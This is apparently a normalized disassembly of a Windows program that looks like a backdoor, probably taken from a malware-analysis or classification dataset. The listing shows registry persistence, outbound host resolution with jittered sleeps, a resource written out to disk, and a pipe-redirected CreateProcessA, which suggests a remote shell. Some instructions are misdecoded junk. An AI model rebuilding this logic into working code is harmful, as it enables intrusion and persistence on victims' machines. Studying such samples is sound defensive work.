sub_401000
sub esp 0x108
lea eax [ esp + 0x4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp ]
push ecx
push rw-data
push 0x80000002
call [ RegOpenKeyA@IAT ]
lea edx [ esp + 0x4 ]
push edx
call [ lstrlenA@IAT ]
mov ecx [ esp ]
push eax
lea eax [ esp + 0x8 ]
push eax
push 0x1
push 0x0
push rw-data
push ecx
call [ RegSetValueExA@IAT ]
mov edx [ esp ]
push edx
call [ RegCloseKey@IAT ]
add esp 0x108
retn
sub_401070
push ebp
mov ebp esp
mov eax 0x4c6c
call sub_4089e0
push ebx
push esi
push edi
mov [ ebp - 0x254c ] 0xd
mov [ ebp - 0xb8 ] 0x0
mov [ ebp - 0x2548 ] 0x0
mov [ ebp - 0x2544 ] 0x0
mov [ ebp - 0x2524 ] 0x0
mov [ ebp - 0x2540 ] 0x5c
mov al [ rw-data ]
mov [ ebp - 0x2520 ] al
mov ecx 0x7ff
xor eax eax
lea edi [ ebp - 0x251f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov cl [ ebp - 0x485c ]
mov [ ebp - 0x28 ] cl
push 0x0
lea ecx [ ebp - 0x28 ]
call sub_4063b0
mov [ ebp - 0x2dc ] 0x5
mov [ ebp - 0x2d8 ] 0x1f4
mov [ ebp - 0x474 ] 0x1
mov [ ebp - 0x478 ] 0x0
mov [ ebp - 0x47c ] 0xc
call sub_401000
call sub_404f50
mov [ ebp - 0x480 ] eax
cmp [ ebp - 0x480 ] 0x0
jne r-xdata
push 0x1b7740
call [ Sleep@IAT ]
jmp r-xdata
cmp [ ebp - 0x480 ] 0x1
jne r-xdata
mov [ ebp - 0x4860 ] 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_4063b0
mov eax [ ebp - 0x4860 ]
jmp r-xdata
lea edx [ ebp - 0x470 ]
push edx
push 0x101
call WSAStartup
mov [ ebp - 0x2c4 ] eax
cmp [ ebp - 0x2c4 ] 0x0
je r-xdata
push 0x0
push 0x0
call [ InternetGetConnectedState@IAT ]
test eax eax
jne r-xdata
call sub_406850
mov [ ebp - 0x2c ] rw-data
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov [ ebp - 0x2538 ] 0x0
mov [ ebp - 0x2e0 ] 0x0
push 0x927c0
call [ Sleep@IAT ]
call WSACleanup
jmp r-xdata
mov al [ ebp - 0x4864 ]
mov [ ebp - 0x2d4 ] al
push 0x0
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
lea ecx [ ebp - 0x2d4 ]
call sub_406440
mov cl [ ebp - 0x4868 ]
mov [ ebp - 0x490 ] cl
push 0x0
lea ecx [ ebp - 0x490 ]
call sub_4063b0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
lea ecx [ ebp - 0x490 ]
call sub_406440
mov dl [ ebp - 0x486c ]
mov [ ebp - 0x520 ] dl
push 0x0
lea ecx [ ebp - 0x520 ]
call sub_4063b0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
lea ecx [ ebp - 0x520 ]
call sub_406440
mov al [ ebp - 0x4870 ]
mov [ ebp - 0x14 ] al
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_4063b0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
lea ecx [ ebp - 0x14 ]
call sub_406440
mov cl [ ebp - 0x4874 ]
mov [ ebp - 0x2534 ] cl
push 0x0
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
lea ecx [ ebp - 0x2534 ]
call sub_406440
mov edx [ r--data ]
push edx
push 0x0
lea eax [ ebp - 0x2d4 ]
push eax
mov ecx rw-data
call sub_406120
mov [ ebp - 0x4978 ] eax
mov [ rw-data ] 0x0
mov ecx [ r--data ]
push ecx
push 0x0
lea edx [ ebp - 0x520 ]
push edx
mov ecx rw-data
call sub_406120
mov [ ebp - 0x497c ] eax
mov eax [ r--data ]
push eax
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
mov ecx rw-data
call sub_406120
mov [ ebp - 0x4980 ] eax
mov [ rw-data ] 0x1bb
mov edx [ r--data ]
push edx
push 0x0
lea eax [ ebp - 0x490 ]
push eax
mov ecx rw-data
call sub_406120
mov [ ebp - 0x4984 ] eax
mov ecx [ ebp - 0x2538 ]
mov [ rw-data ] ecx
mov edx [ ebp - 0x2538 ]
add edx 0x1
mov [ ebp - 0x2538 ] edx
jb r-xdata
call 0xffffffff9cc59c73
mov bh 0xff
dec [ eax - 0x2d37b ]
[ edx ]
lea eax [ ebp - 0x2534 ]
push eax
mov ecx rw-data
call sub_4079b0
and eax 0xff
test eax eax
jne r-xdata
jae r-xdata
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
push 0x80
lea eax [ ebp - 0xb4 ]
push eax
call gethostname
test eax eax
jne r-xdata
push 0x0
call time
add esp 0x4
push eax
call srand
add esp 0x4
call rand
cdq
mov ecx 0x1e
idiv ecx
imul edx edx 0xea60
push edx
call [ Sleep@IAT ]
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
jmp r-xdata
call 0xffffffffdb0c993c
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
lea edi [ ebp - 0xb4 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ ebp - 0xb4 ]
push eax
call gethostbyname
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2554 ] 0x0
jmp r-xdata
nop
clc
jae r-xdata
lea edx [ ebp - 0x4888 ]
push edx
mov ecx rw-data
call sub_4082e0
mov [ ebp - 0x4990 ] eax
mov eax [ r--data ]
push eax
push 0x0
mov ecx [ ebp - 0x4990 ]
push ecx
lea ecx [ ebp - 0x28 ]
call sub_406120
mov [ ebp - 0x498c ] eax
push 0x1
lea ecx [ ebp - 0x4888 ]
call sub_4063b0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push 0x0
push rw-data
lea ecx [ ebp - 0x28 ]
call sub_406320
mov [ ebp - 0x4994 ] eax
cmp [ ebp - 0x4994 ] 0x0
je r-xdata
push 0x0
call time
add esp 0x4
push eax
call srand
add esp 0x4
call rand
cdq
mov ecx 0x3
idiv ecx
imul edx edx 0xea60
push edx
call [ Sleep@IAT ]
push rw-data
call gethostbyname
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
je r-xdata
push 0x4e20
call [ Sleep@IAT ]
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
mov edx [ ebp - 0x30 ]
mov eax [ edx + 0xc ]
mov ecx [ eax ]
mov edx [ ecx ]
push edx
call inet_ntoa
mov [ ebp - 0x34 ] eax
mov ecx 0xc
xor eax eax
mov edi rw-data
[ edi ]
stosw [ edi ]
mov edi [ ebp - 0x34 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov cl [ ebp - 0x4878 ]
mov [ ebp - 0x2564 ] cl
push 0x0
lea ecx [ ebp - 0x2564 ]
call sub_4063b0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
lea ecx [ ebp - 0x2564 ]
call sub_406440
mov edx [ r--data ]
push edx
push 0x0
lea eax [ ebp - 0x2564 ]
push eax
mov ecx rw-data
call sub_406120
mov [ ebp - 0x4988 ] eax
mov ecx [ ebp - 0x2538 ]
mov [ rw-data ] ecx
mov edx [ ebp - 0x2538 ]
add edx 0x1
mov [ ebp - 0x2538 ] edx
lea eax [ ebp - 0x2534 ]
push eax
mov ecx rw-data
call sub_4079b0
and eax 0xff
test eax eax
jne r-xdata
push 0x927c0
call [ Sleep@IAT ]
call WSACleanup
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0x2554 ]
cmp [ eax + ecx * 4 ] 0x0
je r-xdata
jmp r-xdata
jne r-xdata
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
push 0x80
lea eax [ ebp - 0xb4 ]
push eax
call gethostname
test eax eax
jne r-xdata
push 0x0
call time
add esp 0x4
push eax
call srand
add esp 0x4
call rand
cdq
mov ecx 0xa
idiv ecx
imul edx edx 0xea60
push edx
call [ Sleep@IAT ]
push 0x1
lea ecx [ ebp - 0x2564 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0x2554 ]
mov edx [ eax + ecx * 4 ]
mov eax [ edx ]
push eax
call inet_ntoa
mov [ ebp - 0x34 ] eax
mov edi [ ebp - 0x34 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
je r-xdata
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
lea edi [ ebp - 0xb4 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ ebp - 0xb4 ]
push eax
call gethostbyname
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2568 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x2554 ]
add ecx 0x1
mov [ ebp - 0x2554 ] ecx
xor edx edx
mov dl [ rw-data ]
test edx edx
jne r-xdata
jne r-xdata
jmp r-xdata
lea ebp [ edi * 8 - 0x24170001 ]
dec eax
add [ eax ] al
push 0x1
lea ecx [ ebp - 0x2564 ]
call sub_4063b0
push 0x0
call time
add esp 0x4
push eax
call srand
add esp 0x4
call rand
cdq
mov ecx 0x3
idiv ecx
imul edx edx 0xea60
push edx
call [ Sleep@IAT ]
push 0x1
lea ecx [ ebp - 0x2564 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
jmp r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
push 0x7
push rw-data
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0x2568 ]
cmp [ eax + ecx * 4 ] 0x0
je r-xdata
lea eax [ ebp - 0x4898 ]
push eax
mov ecx rw-data
call sub_4082e0
mov [ ebp - 0x499c ] eax
mov ecx [ r--data ]
push ecx
push 0x0
mov edx [ ebp - 0x499c ]
push edx
lea ecx [ ebp - 0x28 ]
call sub_406120
mov [ ebp - 0x4998 ] eax
push 0x1
lea ecx [ ebp - 0x4898 ]
call sub_4063b0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push 0x0
push rw-data
lea ecx [ ebp - 0x28 ]
call sub_406320
mov [ ebp - 0x49a0 ] eax
cmp [ ebp - 0x49a0 ] 0x0
jne r-xdata
push 0x2710
call [ Sleep@IAT ]
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
jmp r-xdata
fisttp [ eax ]
add cl ch
idiv bh
push [ edx + ecx + 0x75 ]
or bl ch
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0x2568 ]
mov edx [ eax + ecx * 4 ]
mov eax [ edx ]
push eax
call inet_ntoa
mov [ ebp - 0x34 ] eax
mov edi [ ebp - 0x34 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push 0x0
push rw-data
lea ecx [ ebp - 0x28 ]
call sub_406320
mov [ ebp - 0x49a8 ] eax
cmp [ ebp - 0x49a8 ] 0x0
jne r-xdata
cmp [ ebp - 0x480 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x2568 ]
add ecx 0x1
mov [ ebp - 0x2568 ] ecx
je r-xdata
mov ecx 0x41
xor eax eax
lea edi [ ebp - 0x2698 ]
[ edi ]
mov edi rw-data
lea edx [ ebp - 0x2698 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push rw-data
push 0x65
push 0x0
call [ FindResourceA@IAT ]
mov [ ebp - 0x26a0 ] eax
cmp [ ebp - 0x26a0 ] 0x0
jne r-xdata
push 0x1f4
call [ Sleep@IAT ]
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ rw-data ]
push edx
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
xor ecx ecx
mov [ ebp - 0x257c ] ecx
mov [ ebp - 0x2578 ] ecx
mov [ ebp - 0x2574 ] ecx
mov [ ebp - 0x2570 ] ecx
mov [ ebp - 0x256c ] ecx
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x49a4 ] edx
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push rw-data
call sub_405400
add esp 0x4
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push 0x0
push rw-data
lea ecx [ ebp - 0x28 ]
call sub_406320
mov [ ebp - 0x49ac ] eax
cmp [ ebp - 0x49ac ] 0x0
jne r-xdata
jne r-xdata
mov ecx [ ebp - 0x26a0 ]
push ecx
push 0x0
call [ LoadResource@IAT ]
mov [ ebp - 0x2594 ] eax
mov edx [ ebp - 0x26a0 ]
push edx
push 0x0
call [ SizeofResource@IAT ]
mov [ ebp - 0x269c ] eax
mov eax [ ebp - 0x2594 ]
push eax
call [ LockResource@IAT ]
mov [ ebp - 0x2590 ] eax
push rw-data
lea ecx [ ebp - 0x2698 ]
push ecx
call fopen
add esp 0x8
mov [ ebp - 0x26e8 ] eax
cmp [ ebp - 0x26e8 ] 0x0
jne r-xdata
mov [ ebp - 0x489c ] 0x0
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_4063b0
mov eax [ ebp - 0x489c ]
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x4b8c ] eax
mov [ ebp - 0x4b8c ] r--data
jmp r-xdata
je r-xdata
mov [ ebp - 0x2764 ] 0x0
mov [ ebp - 0x275c ] 0x0
mov ecx 0x11
xor eax eax
lea edi [ ebp - 0x2750 ]
[ edi ]
lea edx [ ebp - 0x2750 ]
push edx
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x2750 ] 0x44
mov [ ebp - 0x2724 ] 0x101
mov [ ebp - 0x2720 ] 0x0
push 0x14
call malloc
add esp 0x4
mov [ ebp - 0x2700 ] eax
push 0x14
call malloc
add esp 0x4
mov [ ebp - 0x2760 ] eax
push 0x14
call malloc
add esp 0x4
mov [ ebp - 0x2758 ] eax
push 0x32
call malloc
add esp 0x4
mov [ ebp - 0x26fc ] eax
push 0x64
call malloc
add esp 0x4
mov [ ebp - 0x2704 ] eax
xor eax eax
mov ecx [ ebp - 0x2700 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
xor edx edx
mov eax [ ebp - 0x2760 ]
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
xor ecx ecx
mov edx [ ebp - 0x2758 ]
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] ecx
mov ecx 0xc
xor eax eax
mov edi [ ebp - 0x26fc ]
[ edi ]
stosw [ edi ]
mov ecx 0x19
xor eax eax
mov edi [ ebp - 0x2704 ]
[ edi ]
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x49b0 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x26e8 ]
push edx
mov eax [ ebp - 0x269c ]
push eax
push 0x1
mov ecx [ ebp - 0x2590 ]
push ecx
call fwrite
add esp 0x10
mov edx [ ebp - 0x26e8 ]
push edx
call fclose
add esp 0x4
cmp [ ebp - 0xb8 ] 0x0
je r-xdata
mov [ ebp - 0x48a0 ] 0x0
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_4063b0
mov eax [ ebp - 0x48a0 ]
jmp r-xdata
lea edx [ ebp - 0x257c ]
push edx
call atof
add esp 0x4
fmul [ r--data ]
call _ftol
push eax
call [ Sleep@IAT ]
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
jmp r-xdata
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
lea ecx [ ebp - 0x257c ]
push ecx
push rw-data
push rw-data
call sprintf
add esp 0xc
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
mov ecx [ ebp - 0x49a4 ]
sub ecx 0x4
push ecx
mov edx [ ebp - 0x4b8c ]
add edx 0x4
push edx
lea eax [ ebp - 0x257c ]
push eax
call strncpy
add esp 0xc
lea edi [ ebp - 0x257c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
test ecx ecx
jbe r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
jne r-xdata
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x4b90 ] ecx
mov [ ebp - 0x4b90 ] r--data
jmp r-xdata
push 0x0
lea edx [ ebp - 0x47c ]
push edx
push rw-data
push rw-data
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
jb r-xdata
cmp [ ebp - 0xb8 ] 0x0
jne r-xdata
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push 0x0
push rw-data
lea ecx [ ebp - 0x28 ]
call sub_406320
mov [ ebp - 0x49b4 ] eax
cmp [ ebp - 0x49b4 ] 0x0
jne r-xdata
call 0x41014300
add [ ebx - 0x3fcc0037 ] al
mov edi [ ebp - 0x2704 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x253c ] ecx
jge r-xdata
mov edx [ ebp - 0x49b0 ]
sub edx 0x4
push edx
mov eax [ ebp - 0x4b90 ]
add eax 0x4
push eax
mov ecx [ ebp - 0x2704 ]
push ecx
call strncpy
add esp 0xc
mov [ ebp - 0x253c ] 0x0
jmp r-xdata
push 0x0
lea edx [ ebp - 0x47c ]
push edx
push rw-data
push rw-data
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
lea ecx [ ebp - 0x48b0 ]
push ecx
mov ecx rw-data
call sub_4082e0
push 0x1
lea ecx [ ebp - 0x48b0 ]
call sub_4063b0
jmp r-xdata
push 0x4e20
call [ Sleep@IAT ]
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
jae r-xdata
mov [ ebp - 0x2768 ] 0x0
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x49d0 ] edx
mov eax [ ebp - 0x49d0 ]
add eax 0x2
push eax
call malloc
add esp 0x4
mov [ ebp - 0x2768 ] eax
cmp [ ebp - 0x2768 ] 0x0
je r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x253c ]
add edx 0x1
mov [ ebp - 0x2708 ] edx
jmp r-xdata
mov eax [ ebp - 0x2704 ]
add eax [ ebp - 0x253c ]
movsx ecx [ eax ]
cmp ecx 0x2d
je r-xdata
mov ecx 0x11
xor eax eax
lea edi [ ebp - 0x26e4 ]
[ edi ]
lea edx [ ebp - 0x26e4 ]
push edx
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x26e4 ] 0x44
mov [ ebp - 0x26b8 ] 0x101
mov [ ebp - 0x26b4 ] 0x0
mov eax [ rw-data ]
mov [ ebp - 0x26a4 ] eax
mov ecx [ rw-data ]
mov [ ebp - 0x26ac ] ecx
mov edx [ rw-data ]
mov [ ebp - 0x26a8 ] edx
lea eax [ ebp - 0x258c ]
push eax
lea ecx [ ebp - 0x26e4 ]
push ecx
push 0x0
push 0x0
push 0x10
push 0x1
push 0x0
push 0x0
mov edx [ ebp - 0x2c ]
push edx
push 0x0
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
lea ecx [ ebp - 0x48c0 ]
push ecx
mov ecx rw-data
call sub_4082e0
push 0x1
